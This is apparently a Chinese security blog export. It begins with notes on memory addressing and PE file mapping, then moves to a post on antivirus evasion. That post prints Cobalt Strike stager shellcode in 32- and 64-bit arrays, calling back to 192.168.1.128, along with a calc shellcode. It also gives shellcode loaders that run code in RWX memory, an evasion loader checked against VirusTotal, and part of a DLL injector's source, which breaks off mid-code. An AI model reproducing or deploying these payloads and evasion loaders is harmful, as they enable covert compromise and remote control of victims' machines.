<p>例如：有20根地址总线的，总共能拥有 2^20&#x3D;1048576个不相同的地址，一个地址代表一个存储单元，一个存储单元能够存储1byte数据，总共能存储1M数据。即20根地址总线一共能够处理1M的内存数据</p>
<p>CPU的地址使用16进制表示，最多能够找到2^16&#x3D;65536个地址（64k内存数据）</p>
<p>这样就要引入段地址的概念，每一个段也就是每一个64K就是一个基地址，段内的数据的地址就是当前基地址的偏移地址。此时通过段地址+偏移地址就能够找到真正的内存数据了</p>
<p>cpu表示的地址为：基地址：偏移地址 （2个16位的地址 2byte）</p>
<p>例如：0BAC:0100</p>
<p>0BAC是基地址，0100是偏移地址，必须要转换成 20位（也就是5位的16进制）才能在20位地址总线中传递，才能达到 1G的数据访问范围：<strong>内存的物理地址 &#x3D;基地址*16+偏移地址</strong>，即<code>0BAC*16+0100=0BAC0+0100=0BBC0H</code>，实际传递二进制就是：0000 1011 1011 1100 0000</p>
<p>32位汇编 32根地址总线总共能够直接找到2的32次方个地址,也就是4294967296 byte数据 也就是 4G的内存,而且不在将内存分成一段一段 所有的内存区域都是连续的</p>
<h1 id="PE文件与内存映像"><a href="#PE文件与内存映像" class="headerlink" title="PE文件与内存映像"></a>PE文件与内存映像</h1><img src="/image/Pasted image 20240328113559.png" alt="20240328113559.png" />
在执行一个PE文件的时候，windows并不在一开始就将整个文件读入内存的，而是采用与内存映射文件类似的机制。也就是说，windows 装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系。
当且仅当真正执行到某个内存页中的指令或者访问某一页中的数据时，这个页面才会被从磁盘提交到物理内存，这种机制使文件装入的速度和文件大小没有太大的关系。

<p>文件中使用偏移(offset)，内存中使用VA来表示位置。VA 与 RVA 满足下面的换算关系： <strong>RVA + ImageBase &#x3D; VA</strong><br>当 PE 文件被执行时，PE 装载器会为进程分配 4GB 的虚拟地址空间，然后把程序所占用的磁盘空间作为虚拟内存映射到这个4GB的虚拟地址空间中。一般情况下，exe文件默认会映射到虚拟地址空间中的0X400000h的位置，而dll文件默认会定到10000000h。</p>
<p><strong>ImageBase字段</strong></p>
<p>ImageBase字段作用是指出文件的优先装入地址。也就是说当文件被执行时,如果可能的话,Windows优先将文件装入 到由ImageBase字段指定的地址中,只有指定的地址已经被其他模块使用时,文件才被装入到其他地址中。链接器产生可执行文件的时候对应这个地址来生成机器码,所以当文件被装入这个地址时不需 要进行重定位操作,装入的速度最快,如果文件被装载到其他地址的话,将不得不进行重定位操作, 这样就要慢一点。</p>
<p>对于EXE文件来说,由于每个文件总是使用独立的虚拟地址空间,优先装入地址不可能被其他模 块占据,所以EXE总是能够按照这个地址装入,这也意味着EXE文件不再需要重定位信息。对于DLL 文件来说,由于多个DLL文件全部使用宿主EXE文件的地址空间,不能保证优先装入地址没有被其他 的DLL使用,所以DLL文件中必须包含重定位信息以防万一。因此,在IMAGE_FILE_HEADER结构的 Characteristics 字段中,DLL文件对应的IMAGE_FILE_RELOCS_STRIPPED 位总是为0,而EXE文件的这个标志位总是为1。</p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>基础免杀</title>
    <url>/2023/11/09/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<h2 id="Shellcode加载器"><a href="#Shellcode加载器" class="headerlink" title="Shellcode加载器"></a>Shellcode加载器</h2><p>在渗透测试过程中，往往需要使用木马上线目标主机来达到持久化、便捷化控制目标主机的目的。<code>shellcode</code>由于其自身可塑性高，杀软查杀难度较高，因此通常将木马<code>shellcode</code>化后，再进行免杀处理。</p>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p> <code>shellcode</code>为<code>16</code>进制的机器码，是一种地址无关代码，可在暂存器<code>EIP</code>溢出后，塞入一段可以让<code>CPU</code>执行的恶意代码，从而执行攻击者的任何指令。这是因为，当<code>shellcode</code>被写入内存后，会被翻译成<code>CPU</code>指令。<code>CPU</code>自上而下执行这些指令，这其中有一个特殊的寄存器，<code>EIP</code>寄存器，它里面存放的值是<code>CPU</code>下次要执行的指令地址，因此可以通过修改<code>EIP</code>寄存器的值来执行<code>shellcode</code>。</p>
<h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><p>首先用cs生成用于上线的shellcode</p>
<p><strong>calc</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\x48\x81\xEC\x00\x01\x00\x00\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x8B\x40\x18\x48\x8B\x40\x30\x48\x8B\x70\x10\x48\x8B\x58\x40\x48\x8B\x00\x81\x7B\x0C\x33\x00\x32\x00\x75\xEC\x48\x8B\xCE\x48\xC7\xC2\x32\x74\x91\x0C\xE8\xC0\x00\x00\x00\x4C\x8B\xF0\x48\xC7\xC3\x6C\x6C\x00\x00\x53\x48\xBB\x75\x73\x65\x72\x33\x32\x2E\x64\x53\x48\x8B\xCC\x48\x83\xEC\x18\x41\xFF\xD6\x48\x8B\xD8\x48\x8B\xCB\x48\xC7\xC2\x6A\x0A\x38\x1E\xE8\x8E\x00\x00\x00\x4C\x8B\xF0\x4D\x33\xC9\x4D\x33\xC0\x48\x33\xD2\x48\x33\xC9\x41\xFF\xD6\x48\x8B\xCE\x48\xC7\xC2\x51\x2F\xA2\x01\xE8\x6D\x00\x00\x00\x4C\x8B\xF0\x48\x33\xC0\x50\x48\xB8\x63\x61\x6C\x63\x2E\x65\x78\x65\x50\x48\x8B\xCC\x48\x83\xEC\x20\x48\xC7\xC2\x01\x00\x00\x00\x41\xFF\xD6\x48\x8B\xCE\x48\xBA\x85\xDF\xAF\xBB\x00\x00\x00\x00\xE8\x38\x00\x00\x00\x4C\x8B\xF0\x48\xC7\xC0\x61\x64\x00\x00\x50\x48\xB8\x45\x78\x69\x74\x54\x68\x72\x65\x50\x48\x8B\xCE\x48\x8B\xD4\x48\x83\xEC\x20\x41\xFF\xD6\x4C\x8B\xF0\x48\x81\xC4\x88\x01\x00\x00\x48\x83\xEC\x18\x48\x33\xC9\x41\xFF\xD6\xC3\x48\x83\xEC\x40\x56\x48\x8B\xFA\x48\x8B\xD9\x48\x8B\x73\x3C\x48\x8B\xC6\x48\xC1\xE0\x36\x48\xC1\xE8\x36\x48\x8B\xB4\x03\x88\x00\x00\x00\x48\xC1\xE6\x20\x48\xC1\xEE\x20\x48\x03\xF3\x56\x8B\x76\x20\x48\x03\xF3\x48\x33\xC9\xFF\xC9\xFF\xC1\xAD\x48\x03\xC3\x33\xD2\x80\x38\x00\x74\x0F\xC1\xCA\x07\x51\x0F\xBE\x08\x03\xD1\x59\x48\xFF\xC0\xEB\xEC\x3B\xD7\x75\xE0\x5E\x8B\x56\x24\x48\x03\xD3\x0F\xBF\x0C\x4A\x8B\x56\x1C\x48\x03\xD3\x8B\x04\x8A\x48\x03\xC3\x5E\x48\x83\xC4\x40\xC3</span><br></pre></td></tr></table></figure>

<p><strong>32位</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* length: 798 bytes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x33\x64\x4d\x78\x00\xa7\xf5\x92\xec\x37\x66\xaf\xf3\xf2\xae\x3a\xd1\x3a\x4c\x63\xb8\xf7\x28\x0d\x1b\xf1\x80\x1c\x5e\x3a\xb9\xc7\x75\xb7\x07\x00\xae\xb9\x5e\x91\x38\x0a\x09\x4d\x7b\xa3\xe5\x91\x32\x21\x87\x7c\x25\x87\xe3\x17\x75\x01\x7b\x76\x81\x9b\x41\x74\x6a\x20\xa0\x0a\x52\xb7\xc1\x98\xe4\x40\x55\x63\xba\xce\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x4d\x53\x45\x29\x0d\x0a\x00\x4a\xd7\x24\x6f\xdd\x1e\x28\x0c\xe9\x49\x97\x85\xa9\xc1\x58\xfc\x52\x3f\x86\xda\x66\x2e\x1a\xed\x5c\xf8\x0f\x68\xa1\x67\xc7\xc4\xf7\xd1\xee\xfb\xeb\x75\x45\xec\xf3\x27\xa7\xf8\x2a\x72\x16\xd2\x35\x69\x08\x86\x36\xfc\xd4\x39\x5d\x03\xb6\x0a\xa7\xa3\xc9\x92\xe9\x11\xad\x87\x41\x57\xc9\x13\x25\xd3\x52\x8f\x75\xc0\x93\xef\xf4\xce\x7b\x79\x84\x0d\x2d\x72\x46\x52\x96\x68\x8a\x61\xcf\x37\xbc\x81\x36\x24\x55\x98\x20\x2c\xa2\x56\x20\x17\x91\x69\xb4\x2f\xc1\x6d\x8c\x61\xc1\x39\xe4\x4d\x21\x84\xc3\xa7\xa5\x21\x91\x21\x23\x20\x87\x8e\x5d\x30\x6a\x5e\xca\xc0\x5e\xfb\x6d\xe8\xf4\x9b\x56\xf1\x48\xfd\x8b\x51\x95\x92\x74\x99\x90\x0a\x0e\xa1\xd1\x06\x63\x1b\x44\xf9\x0b\xc1\x26\xd0\x82\xe6\xec\x8a\xde\xb4\xc9\xf2\x85\x64\xd1\x6c\x12\x2a\xb7\x57\x8c\xfa\xbc\x48\x26\xe8\x5e\x97\xcf\x99\x73\xf0\x6d\xc9\xea\x28\x4a\x49\x1c\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x32\x38\x00\x49\x96\x02\xd2&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>64位</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* length: 892 bytes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x54\x49\x54\x6c\x00\x61\x85\x2d\x13\x88\xf6\x4a\x2c\x57\x8c\x29\x08\x71\x8f\xc1\x01\xed\x6d\xcc\xa9\xf0\x40\x9d\x9e\x7c\x18\x3d\xbd\x21\xfb\x13\x94\x79\xf5\xc7\x99\xa8\x72\xfb\x28\xb6\xaa\xc0\xcf\xaa\xa8\x4e\x09\xdc\xd3\x7d\x63\x77\x57\xb9\x40\x9c\x94\xdb\x5d\x39\xd6\x96\x38\x8a\xf6\xe2\x80\x17\x25\x17\x49\x40\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x44\x44\x43\x4a\x53\x29\x0d\x0a\x00\xd9\x15\xca\x8d\xd0\x59\x00\x30\xf1\xcf\xe4\x90\x68\x2b\xfd\x48\x06\xee\x2f\xc6\x62\x36\x0e\x54\x1a\x8a\xf9\x14\xd2\xf0\xd8\x3b\x18\x0c\xfd\xc2\x17\x1b\x6c\x17\xc0\xf2\xc1\xe0\x7f\xb3\xad\x1f\x5e\x36\x59\xdb\xd8\xec\xa8\x90\xab\x36\x5a\xbb\x16\x7b\x42\x59\x53\x42\x50\xd7\x1b\x71\xc9\x84\x2a\xbe\xe0\x82\x5c\xfc\x1a\x6c\xf3\x05\xba\x00\x9b\xd4\x06\xba\xac\x7d\xe7\x49\x67\x90\x7f\xc9\x9a\x08\xde\x36\x81\xa9\xe9\xcf\xf7\x5d\xf2\x45\x61\xef\xed\xc1\x9d\x52\xef\x4f\x4c\x85\x06\x02\xc2\x21\xe6\x6e\x68\x23\x78\x73\x06\xc5\x11\xc4\xac\x3c\x5d\x97\xa2\x5f\x4b\x63\xbb\x0d\xe2\xa6\x50\x18\x21\xb2\x96\x9a\x4c\xbb\xbd\x96\x95\x45\xf8\x25\xe5\xb8\x47\x44\xae\x23\xce\x6d\x79\xa3\x06\x60\x17\xd3\xe8\x0e\x01\xc0\xb5\x2c\x32\xb8\x88\xe2\xc0\x0b\x97\xec\x06\xb7\x4a\x67\x97\xcb\x44\x78\xa7\x01\x9e\xe2\xe4\x2b\x46\x8a\xef\x93\xea\x42\x7e\x28\xe6\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x32\x38\x00\x49\x96\x02\xd2&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="加载shellcode"><a href="#加载shellcode" class="headerlink" title="加载shellcode"></a>加载shellcode</h3><h4 id="c语言内联汇编（支持32位）"><a href="#c语言内联汇编（支持32位）" class="headerlink" title="c语言内联汇编（支持32位）"></a>c语言内联汇编（支持32位）</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) <span class="comment">//将data段的内存设置成可读可写可执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* shellcode代码段 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		lea eax,buf		<span class="comment">//加载buf的地址到eax寄存器</span></span><br><span class="line">		call eax		<span class="comment">//通过call函数来调用</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231109152818466.png" alt="image-20231109152818466" style="zoom:80%;" />



<h2 id="免杀——c语言"><a href="#免杀——c语言" class="headerlink" title="免杀——c语言"></a>免杀——c语言</h2><h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>首先拿一个弹计算器的十六进制shellcode</p>
<p><strong>shellcode_hex.txt</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4881EC0001000065488B042560000000488B4018488B4030488B7010488B5840488B00817B0C3300320075EC488BCE48C7C23274910CE8C00000004C8BF048C7C36C6C00005348BB7573657233322E6453488BCC4883EC1841FFD6488BD8488BCB48C7C26A0A381EE88E0000004C8BF04D33C94D33C04833D24833C941FFD6488BCE48C7C2512FA201E86D0000004C8BF04833C05048B863616C632E65786550488BCC4883EC2048C7C20100000041FFD6488BCE48BA85DFAFBB00000000E8380000004C8BF048C7C0616400005048B8457869745468726550488BCE488BD44883EC2041FFD64C8BF04881C4880100004883EC184833C941FFD6C34883EC4056488BFA488BD9488B733C488BC648C1E03648C1E836488BB4038800000048C1E62048C1EE204803F3568B76204803F34833C9FFC9FFC1AD4803C333D2803800740FC1CA07510FBE0803D15948FFC0EBEC3BD775E05E8B56244803D30FBF0C4A8B561C4803D38B048A4803C35E4883C440C3</span><br></pre></td></tr></table></figure>

<p>写一个初步的加载器：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">hexCharToByte</span><span class="params">(<span class="type">char</span> character)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hexStringToBytes</span><span class="params">(<span class="type">const</span> std::string&amp; hexString, <span class="type">unsigned</span> <span class="type">char</span>* byteArray, <span class="type">int</span> byteArraySize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; hexString.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">        byteArray[i / <span class="number">2</span>] = <span class="built_in">hexCharToByte</span>(hexString[i]) * <span class="number">16</span> + <span class="built_in">hexCharToByte</span>(hexString[i + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    std::string filepath = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="function">std::ifstream <span class="title">file</span><span class="params">(filepath)</span></span>;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    string contents;</span><br><span class="line">    <span class="keyword">if</span> (file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::stringstream buffer;</span><br><span class="line">        buffer &lt;&lt; file.<span class="built_in">rdbuf</span>();</span><br><span class="line">        contents = buffer.<span class="built_in">str</span>();</span><br><span class="line">        size = contents.<span class="built_in">length</span>()/<span class="number">2</span>;</span><br><span class="line">        file.<span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buffer = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">hexStringToBytes</span>(contents, buffer, size);</span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buffer, size);</span><br><span class="line">    ((<span class="built_in">void</span>(*) ())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vs编译后加载shellcode</p>
<img src="/image/image-20231109173123369.png" alt="image-20231109173123369" style="zoom:50%;" />

<p><strong>virus total</strong></p>
<img src="/image/image-20231109173238057.png" alt="image-20231109173238057" style="zoom: 33%;" />

<p><strong>微步</strong></p>
<img src="/image/image-20231109173658924.png" alt="image-20231109173658924" style="zoom: 33%;" />

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>python官方提供了两个文件</p>
<p><code>inject_dll_amd64.exe</code>和<code>inject_dll_x86.exe</code></p>
<p>两个文件是DLL注入器，分别对应X86和X64位操作系统，在Windows目录下存在c++源码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;kernel32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;user32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Helper to free data when we leave the scope.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataToFree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE snapshotHandle;</span><br><span class="line">    </span><br><span class="line">    LPVOID remoteMemoryAddr;</span><br><span class="line">    <span class="type">int</span> remoteMemorySize;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">DataToFree</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;hProcess = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;snapshotHandle = <span class="literal">nullptr</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">this</span>-&gt;remoteMemoryAddr = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;remoteMemorySize = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ~<span class="built_in">DataToFree</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;hProcess != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;remoteMemoryAddr != <span class="literal">nullptr</span> &amp;&amp; <span class="keyword">this</span>-&gt;remoteMemorySize != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">VirtualFreeEx</span>(<span class="keyword">this</span>-&gt;hProcess, <span class="keyword">this</span>-&gt;remoteMemoryAddr, <span class="keyword">this</span>-&gt;remoteMemorySize, MEM_RELEASE);</span><br><span class="line">                <span class="keyword">this</span>-&gt;remoteMemoryAddr = <span class="literal">nullptr</span>;</span><br><span class="line">                <span class="keyword">this</span>-&gt;remoteMemorySize = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">CloseHandle</span>(<span class="keyword">this</span>-&gt;hProcess);</span><br><span class="line">            <span class="keyword">this</span>-&gt;hProcess = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;snapshotHandle != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="built_in">CloseHandle</span>(<span class="keyword">this</span>-&gt;snapshotHandle);</span><br><span class="line">            <span class="keyword">this</span>-&gt;snapshotHandle = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span 